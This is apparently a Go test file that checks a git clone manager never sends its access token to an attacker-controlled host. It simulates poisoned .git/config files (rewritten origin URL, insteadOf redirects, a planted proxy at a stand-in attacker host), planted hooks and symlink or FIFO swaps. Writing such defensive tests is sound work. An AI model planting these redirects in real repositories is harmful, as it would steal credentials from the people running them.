/*
Copyright 2026 Chainguard, Inc.
SPDX-License-Identifier: Apache-2.0
*/

package clonemanager

import (
	"errors"
	"fmt"
	"math/rand/v2"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"testing"

	"chainguard.dev/driftlessaf/reconcilers/githubreconciler"
	"github.com/go-git/go-git/v5"
	gitconfig "github.com/go-git/go-git/v5/config"
	"github.com/go-git/go-git/v5/plumbing"
)

// TestMain widens allowedProtocols to cover the local (file/http) remotes the
// suite's fixtures use; production pins https alone. The prod default is
// pinned explicitly by TestGitCLIProdAllowlistBlocksFileRedirect.
func TestMain(m *testing.M) {
	allowedProtocols = "https:http:file"
	os.Exit(m.Run())
}

// recordingServer is an HTTP stand-in for a git remote that records the
// BasicAuth credentials of every request it receives. The push credential rides
// the first (info/refs) request, so we never need to speak the full git
// protocol — we challenge unauthenticated requests so the credential arrives
// whether go-git sends auth preemptively or only after a 401.
func recordingServer(t *testing.T) (*httptest.Server, func() []string) {
	t.Helper()
	var (
		mu     sync.Mutex
		passes []string
	)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, pass, ok := r.BasicAuth()
		if !ok {
			w.Header().Set("WWW-Authenticate", `Basic realm="git"`)
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		mu.Lock()
		passes = append(passes, pass)
		mu.Unlock()
		w.WriteHeader(http.StatusOK)
	}))
	t.Cleanup(srv.Close)
	return srv, func() []string {
		mu.Lock()
		defer mu.Unlock()
		return append([]string(nil), passes...)
	}
}

// TestForcePushUsesTrustedRemoteURLNotGitConfig is a security regression test
// for a credential-exfil vector: a consumer may expose the lease's working tree
// — which contains the live .git/ — to untrusted code with write access, so a
// rewritten [remote "origin"] url must not redirect the credentialed force-push.
// forcePushBranch must push to the trusted URL resolved when the lease was
// created, NOT to whatever .git/config currently says, so the access token
// (carried as the BasicAuth password) only ever reaches the known-good host.
func TestForcePushUsesTrustedRemoteURLNotGitConfig(t *testing.T) {
	ctx := t.Context()

	trusted, trustedCreds := recordingServer(t) // the real origin (passed to forcePushBranch)
	attacker, attackerCreds := recordingServer(t)

	// A non-bare clone with a commit and an "origin" pointing at the trusted host.
	dir, _ := initTestRepo(t)
	repo, err := git.PlainOpen(dir)
	if err != nil {
		t.Fatalf("PlainOpen: %v", err)
	}
	trustedURL := trusted.URL + "/owner/repo.git"
	if _, err := repo.CreateRemote(&gitconfig.RemoteConfig{Name: "origin", URLs: []string{trustedURL}}); err != nil {
		t.Fatalf("CreateRemote: %v", err)
	}

	// The push credential, randomized so a coincidental match can't mask a bug
	// (per repo test conventions).
	sentinel := fmt.Sprintf("ghs_test_%d", rand.Int64())
	m := &Manager{tokenSource: staticTokenSource(sentinel), identity: "clonemanager-test"}

	// Simulate untrusted code rewriting .git/config through write access to the
	// working tree — exactly what `git remote set-url origin <attacker>` or a
	// `sed` does. We edit the on-disk file directly (NOT via a go-git API) to
	// prove the push does not honor a raw on-disk edit.
	cfgPath := filepath.Join(dir, ".git", "config")
	raw, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatalf("read .git/config: %v", err)
	}
	attackerURL := attacker.URL + "/attacker/repo.git"
	rewritten := strings.Replace(string(raw), trustedURL, attackerURL, 1)
	if rewritten == string(raw) {
		t.Fatalf("origin url %q not present in .git/config; cannot simulate the rewrite:\n%s", trustedURL, raw)
	}
	if err := os.WriteFile(cfgPath, []byte(rewritten), 0o644); err != nil {
		t.Fatalf("rewrite .git/config: %v", err)
	}

	// Push as a consumer does after running untrusted code against the working
	// tree, supplying the known-good URL resolved when the lease was created. The
	// push itself fails (neither recording server is a real git endpoint), but
	// the credential reaches the first request regardless — so we can assert
	// WHERE it went.
	head, err := repo.Head()
	if err != nil {
		t.Fatalf("Head: %v", err)
	}
	_ = m.forcePushBranch(ctx, repo, head.Name(), trustedURL)

	// The token must NOT have reached the attacker host named by the rewritten
	// .git/config...
	if leaked := attackerCreds(); len(leaked) > 0 {
		t.Errorf("token leaked to the .git/config-rewritten host: got %d credentialed request(s) to the attacker, want 0 — forcePushBranch trusted on-disk config instead of the known-good URL", len(leaked))
	}
	// ...and it must have reached the trusted host that was passed in.
	got := trustedCreds()
	sawSentinel := false
	for _, p := range got {
		if p == sentinel {
			sawSentinel = true
		}
	}
	if !sawSentinel {
		t.Errorf("push did not reach the trusted host with the token: got credentialed requests %v to trusted, want one carrying %q", got, sentinel)
	}
}

// TestFetchUsesTrustedRemoteURLNotGitConfig is the fetch-side counterpart. A
// consumer may expose a lease's working tree — which contains the live .git/ —
// to untrusted code with write access, and clones are reused from a pool across
// reconciles, so a rewritten [remote "origin"] url can persist (resetClone does
// not touch .git/config). prepareClone must fetch from the trusted URL resolved
// when the lease was created, NOT from .git/config, so the access token (carried
// as the BasicAuth password) only ever reaches the known-good host.
func TestFetchUsesTrustedRemoteURLNotGitConfig(t *testing.T) {
	ctx := t.Context()

	trusted, trustedCreds := recordingServer(t)
	attacker, attackerCreds := recordingServer(t)

	dir, _ := initTestRepo(t)
	repo, err := git.PlainOpen(dir)
	if err != nil {
		t.Fatalf("PlainOpen: %v", err)
	}
	trustedURL := trusted.URL + "/owner/repo.git"
	if _, err := repo.CreateRemote(&gitconfig.RemoteConfig{Name: "origin", URLs: []string{trustedURL}}); err != nil {
		t.Fatalf("CreateRemote: %v", err)
	}

	// prepareClone resolves the trusted fetch URL via repoURL(res); stub it to the
	// trusted host — the lease-time resolution that no guest can influence.
	origRepoURL := repoURL
	repoURL = func(*githubreconciler.Resource) string { return trustedURL }
	defer func() { repoURL = origRepoURL }()

	sentinel := fmt.Sprintf("ghs_test_%d", rand.Int64())
	m, err := New(ctx, staticTokenSource(sentinel), "clonemanager-test", nil)
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	// Simulate untrusted code rewriting .git/config through write access to the
	// working tree; on clone reuse the rewrite persists. We edit the on-disk file
	// directly (NOT via a go-git API) to prove the fetch does not honor it.
	cfgPath := filepath.Join(dir, ".git", "config")
	raw, err := os.ReadFile(cfgPath)
	if err != nil {
		t.Fatalf("read .git/config: %v", err)
	}
	attackerURL := attacker.URL + "/attacker/repo.git"
	rewritten := strings.Replace(string(raw), trustedURL, attackerURL, 1)
	if rewritten == string(raw) {
		t.Fatalf("origin url %q not present in .git/config; cannot simulate the rewrite:\n%s", trustedURL, raw)
	}
	if err := os.WriteFile(cfgPath, []byte(rewritten), 0o644); err != nil {
		t.Fatalf("rewrite .git/config: %v", err)
	}

	// prepareClone fetches at lease time. It fails after the fetch (neither
	// recording server is a real git endpoint), but the credential reaches the
	// first request regardless — so we can assert WHERE it went.
	cl := &clone{path: dir, repo: repo}
	res := &githubreconciler.Resource{Owner: "owner", Repo: "repo", Ref: "master", Path: "x", Type: githubreconciler.ResourceTypePath}
	_, _, _ = m.prepareClone(ctx, cl, "master", res, 1)

	if leaked := attackerCreds(); len(leaked) > 0 {
		t.Errorf("token leaked to the .git/config-rewritten host: got %d credentialed fetch request(s) to the attacker, want 0 — prepareClone fetched from on-disk config instead of the known-good URL", len(leaked))
	}
	got := trustedCreds()
	sawSentinel := false
	for _, p := range got {
		if p == sentinel {
			sawSentinel = true
		}
	}
	if !sawSentinel {
		t.Errorf("fetch did not reach the trusted host with the token: got credentialed requests %v to trusted, want one carrying %q", got, sentinel)
	}
}

// TestGitCLICheckoutIgnoresPlantedHooks pins the core.hooksPath defense: an
// attacker with write access to a pooled clone's .git/ can plant a
// post-checkout hook, and the CLI backend's worktree operations must never
// execute it. Deleting the hooksPath pin in env() must fail this test.
func TestGitCLICheckoutIgnoresPlantedHooks(t *testing.T) {
	ctx := t.Context()

	dir, firstHash := initTestRepo(t)
	commitToTestRepo(t, dir, "second.yaml")

	marker := filepath.Join(t.TempDir(), "hook-ran")
	hook := fmt.Sprintf("#!/bin/sh\ntouch %q\n", marker)
	hooksDir := filepath.Join(dir, ".git", "hooks")
	if err := os.MkdirAll(hooksDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(filepath.Join(hooksDir, "post-checkout"), []byte(hook), 0o755); err != nil { //nolint:gosec // executable hook fixture
		t.Fatalf("planting hook: %v", err)
	}

	m, err := New(ctx, staticTokenSource(""), "clonemanager-test", nil, WithGitCLI())
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	repo, err := git.PlainOpen(dir)
	if err != nil {
		t.Fatalf("PlainOpen: %v", err)
	}
	if err := m.backend.checkout(ctx, &clone{path: dir, repo: repo}, plumbing.NewHash(firstHash)); err != nil {
		t.Fatalf("checkout: %v", err)
	}

	if _, err := os.Stat(marker); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("planted post-checkout hook executed (marker %s exists, err=%v), want hook suppressed via core.hooksPath", marker, err)
	}
}

// TestResetGitConfigReplacesIrregularInodes pins resetGitConfig's
// write-to-temp-plus-rename behavior: a .git/config replaced by untrusted
// code with a symlink must not redirect the write outside the clone, and one
// replaced with a FIFO must not block the goroutine. A plain os.WriteFile
// fails both.
func TestResetGitConfigReplacesIrregularInodes(t *testing.T) {
	t.Run("symlink", func(t *testing.T) {
		dir, _ := initTestRepo(t)
		victim := filepath.Join(t.TempDir(), "victim")
		if err := os.WriteFile(victim, []byte("precious"), 0o600); err != nil {
			t.Fatalf("WriteFile: %v", err)
		}
		cfg := filepath.Join(dir, ".git", "config")
		if err := os.Remove(cfg); err != nil {
			t.Fatalf("Remove: %v", err)
		}
		if err := os.Symlink(victim, cfg); err != nil {
			t.Fatalf("Symlink: %v", err)
		}

		if err := resetGitConfig(dir); err != nil {
			t.Fatalf("resetGitConfig: %v", err)
		}

		got, err := os.ReadFile(victim)
		if err != nil || string(got) != "precious" {
			t.Errorf("symlink target overwritten: content=%q err=%v, want untouched", got, err)
		}
		fi, err := os.Lstat(cfg)
		if err != nil || !fi.Mode().IsRegular() {
			t.Errorf(".git/config after reset: mode=%v err=%v, want regular file", fi.Mode(), err)
		}
	})

	t.Run("fifo", func(t *testing.T) {
		dir, _ := initTestRepo(t)
		cfg := filepath.Join(dir, ".git", "config")
		if err := os.Remove(cfg); err != nil {
			t.Fatalf("Remove: %v", err)
		}
		if err := syscall.Mkfifo(cfg, 0o600); err != nil {
			t.Fatalf("Mkfifo: %v", err)
		}

		// A direct write would block forever on the readerless FIFO; the
		// rename-based reset must complete. The test timeout is the guard.
		if err := resetGitConfig(dir); err != nil {
			t.Fatalf("resetGitConfig: %v", err)
		}
		fi, err := os.Lstat(cfg)
		if err != nil || !fi.Mode().IsRegular() {
			t.Errorf(".git/config after reset: mode=%v err=%v, want regular file", fi.Mode(), err)
		}
	})

	t.Run("symlinked_git_dir", func(t *testing.T) {
		dir, _ := initTestRepo(t)
		victim := t.TempDir()
		gitDir := filepath.Join(dir, ".git")
		if err := os.RemoveAll(gitDir); err != nil {
			t.Fatalf("RemoveAll: %v", err)
		}
		// Replace .git itself with a symlink to an external directory.
		if err := os.Symlink(victim, gitDir); err != nil {
			t.Fatalf("Symlink: %v", err)
		}

		// resetGitConfig must refuse rather than write victim/config through
		// the symlinked .git.
		if err := resetGitConfig(dir); err == nil {
			t.Errorf("resetGitConfig succeeded through a symlinked .git, want error")
		}
		if _, err := os.Stat(filepath.Join(victim, "config")); !errors.Is(err, os.ErrNotExist) {
			t.Errorf("external config written through symlinked .git: err=%v, want not-exist", err)
		}
	})
}

// TestGitCLIFetchIgnoresPoisonedGitConfig is the git CLI counterpart of
// TestFetchUsesTrustedRemoteURLNotGitConfig, with a wider attack surface: the
// git binary honors directives go-git never reads, so beyond rewriting the
// origin URL an attacker can plant url.<base>.insteadOf to redirect even a
// fetch that names the trusted URL explicitly. resetGitConfig must wipe all
// of it before the credentialed fetch runs.
func TestGitCLIFetchIgnoresPoisonedGitConfig(t *testing.T) {
	ctx := t.Context()

	trusted, trustedCreds := recordingServer(t)
	attacker, attackerCreds := recordingServer(t)

	dir, _ := initTestRepo(t)
	repo, err := git.PlainOpen(dir)
	if err != nil {
		t.Fatalf("PlainOpen: %v", err)
	}
	trustedURL := trusted.URL + "/owner/repo.git"

	restore := SetRepoURLForTesting(func(*githubreconciler.Resource) string { return trustedURL })
	defer restore()

	sentinel := fmt.Sprintf("ghs_test_%d", rand.Int64())
	m, err := New(ctx, staticTokenSource(sentinel), "clonemanager-test", nil, WithGitCLI())
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	// Poison .git/config with both known redirect vectors: a rewritten origin
	// URL and an insteadOf mapping that would rewrite the trusted URL itself.
	attackerURL := attacker.URL + "/attacker/repo.git"
	poisoned := fmt.Sprintf(`[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
[remote "origin"]
	url = %s
	fetch = +refs/heads/*:refs/remotes/origin/*
[url %q]
	insteadOf = %s
`, attackerURL, attackerURL, trustedURL)
	if err := os.WriteFile(filepath.Join(dir, ".git", "config"), []byte(poisoned), 0o644); err != nil {
		t.Fatalf("poison .git/config: %v", err)
	}

	// The fetch fails (neither recording server is a real git endpoint), but
	// the credential reaches the first request regardless — so we can assert
	// WHERE it went.
	cl := &clone{path: dir, repo: repo}
	res := &githubreconciler.Resource{Owner: "owner", Repo: "repo", Ref: "master", Path: "x", Type: githubreconciler.ResourceTypePath}
	_, _, _ = m.prepareClone(ctx, cl, "master", res, 1)

	if leaked := attackerCreds(); len(leaked) > 0 {
		t.Errorf("token leaked to the host named by the poisoned .git/config: got %d credentialed request(s) to the attacker, want 0 — the CLI fetch honored on-disk config instead of resetting it", len(leaked))
	}
	got := trustedCreds()
	sawSentinel := false
	for _, p := range got {
		if p == sentinel {
			sawSentinel = true
		}
	}
	if !sawSentinel {
		t.Errorf("fetch did not reach the trusted host with the token: got credentialed requests %v to trusted, want one carrying %q", got, sentinel)
	}
}

// TestGitCLIScopedTokenSurvivesInsteadOfRace covers the TOCTOU window that
// resetGitConfig alone cannot close: a still-running attacker process replants
// url.<host>.insteadOf AFTER the reset but before git reads the config,
// redirecting the explicit fetch URL. The token rides a URL-scoped
// http.<url>.extraheader, so git will not attach it to a request whose
// (post-rewrite) URL does not match that prefix — the credential cannot follow
// the redirect to the attacker host. This drives the fetch through the backend
// exec path with the poisoned config left in place (reset already defeated).
func TestGitCLIScopedTokenSurvivesInsteadOfRace(t *testing.T) {
	ctx := t.Context()

	trusted, trustedCreds := recordingServer(t)
	attacker, attackerCreds := recordingServer(t)
	trustedURL := trusted.URL + "/owner/repo"
	attackerURL := attacker.URL + "/attacker/repo"

	dir, _ := initTestRepo(t)

	// Plant an exact-URL insteadOf rewrite trusted -> attacker and leave it in
	// place: this stands in for a config re-poisoned after resetGitConfig ran.
	poisoned := fmt.Sprintf("[core]\n\trepositoryformatversion = 0\n[url %q]\n\tinsteadOf = %s\n", attackerURL, trustedURL)
	if err := os.WriteFile(filepath.Join(dir, ".git", "config"), []byte(poisoned), 0o600); err != nil {
		t.Fatalf("poison .git/config: %v", err)
	}

	sentinel := fmt.Sprintf("ghs_test_%d", rand.Int64())
	b := cliBackend{tokenSource: staticTokenSource(sentinel)}
	env, err := b.env(trustedURL)
	if err != nil {
		t.Fatalf("env: %v", err)
	}
	// exec, not runInClone: skipping resetGitConfig keeps the poisoned config
	// live at fetch time, which is exactly the race this defends.
	_ = b.exec(ctx, dir, trustedURL, env, "fetch", "--no-tags", "--depth=1", trustedURL, "+refs/heads/master:refs/remotes/origin/master")

	// Whichever insteadOf wins the tie, the token must never reach the attacker.
	for _, p := range attackerCreds() {
		if p == sentinel {
			t.Errorf("scoped token leaked to the attacker host via insteadOf rewrite: want the URL-scoped header to not follow the redirect")
		}
	}
	// A request that does reach the trusted host carries the token, so the
	// scoping did not simply suppress auth everywhere.
	if creds := trustedCreds(); len(creds) > 0 {
		saw := false
		for _, p := range creds {
			if p == sentinel {
				saw = true
			}
		}
		if !saw {
			t.Errorf("trusted host received requests %v but none carried the token %q", creds, sentinel)
		}
	}
}

// TestGitCLIProxyPinBeatsPlantedURLScopedProxy proves the env() proxy pins
// defeat a url-scoped http.<remote>.proxy planted in .git/config. Git resolves
// http.<url>.proxy by URL-specificity across config scopes, so a bare
// http.proxy="" does not outrank a url-scoped local entry; the url-scoped pin
// does, at equal specificity from command scope. Resolved with
// --get-urlmatch, which applies the same url-matching git uses at fetch time,
// without a network round-trip.
func TestGitCLIProxyPinBeatsPlantedURLScopedProxy(t *testing.T) {
	ctx := t.Context()
	remote := "https://github.com/owner/repo"

	dir := t.TempDir()
	if out, err := exec.CommandContext(ctx, "git", "init", "-q", dir).CombinedOutput(); err != nil {
		t.Fatalf("git init: %v: %s", err, out)
	}
	// Attacker plants a url-scoped proxy that would capture the fetch.
	plant := exec.CommandContext(ctx, "git", "-C", dir, "config", "http."+remote+".proxy", "http://attacker.invalid:8080")
	if out, err := plant.CombinedOutput(); err != nil {
		t.Fatalf("plant proxy: %v: %s", err, out)
	}

	b := cliBackend{tokenSource: staticTokenSource("t")}
	env, err := b.env(remote)
	if err != nil {
		t.Fatalf("env: %v", err)
	}

	resolve := exec.CommandContext(ctx, "git", "-C", dir, "config", "--get-urlmatch", "http.proxy", remote)
	resolve.Env = env
	out, err := resolve.Output()
	if err != nil {
		// A cleared value can exit non-zero with empty output; only the
		// resolved value matters.
		out = nil
	}
	if got := strings.TrimSpace(string(out)); got != "" {
		t.Errorf("effective proxy for %q: got %q, want empty (env pin should win over the planted url-scoped proxy)", remote, got)
	}
}

// TestGitCLIProdAllowlistBlocksFileRedirect pins the production
// GIT_ALLOW_PROTOCOL default (https only): a url.*.insteadOf rewrite planted
// in .git/config that redirects the https remote to a file:// path must be
// refused by git rather than silently fetching attacker-chosen local objects.
// TestGitCLIProdAllowlistBlocksFileProtocol pins the prod GIT_ALLOW_PROTOCOL
// default (https only): git must refuse a file:// fetch, the backstop against a
// url.*.insteadOf rewrite to file://. Uses exec (not runInClone) so no config
// reset intervenes; the control arm widens the allowlist to prove the assertion
// turns on allowedProtocols, not on a missing remote.
func TestGitCLIProdAllowlistBlocksFileProtocol(t *testing.T) {
	ctx := t.Context()

	fetchedRef := func(t *testing.T, allow string) bool {
		t.Helper()

		victim, victimHead := initTestRepo(t)
		dir, _ := initTestRepo(t)
		fileURL := "file://" + victim

		prev := allowedProtocols
		allowedProtocols = allow
		t.Cleanup(func() { allowedProtocols = prev })

		b := cliBackend{tokenSource: staticTokenSource("")}
		env, err := b.env(fileURL)
		if err != nil {
			t.Fatalf("env: %v", err)
		}
		_ = b.exec(ctx, dir, fileURL, env, "fetch", "--no-tags", "--depth=1", fileURL, "+refs/heads/master:refs/remotes/origin/master")

		out, err := exec.CommandContext(ctx, "git", "-C", dir, "rev-parse", "--verify", "--quiet", "refs/remotes/origin/master").Output()
		if err != nil {
			return false
		}
		return strings.TrimSpace(string(out)) == victimHead
	}

	if fetchedRef(t, "https") {
		t.Errorf("prod allowlist %q permitted a file:// fetch; want it refused", "https")
	}
	if !fetchedRef(t, "https:file") {
		t.Errorf("widened allowlist %q did not permit the file:// fetch; test would not actually exercise the protocol gate", "https:file")
	}
}
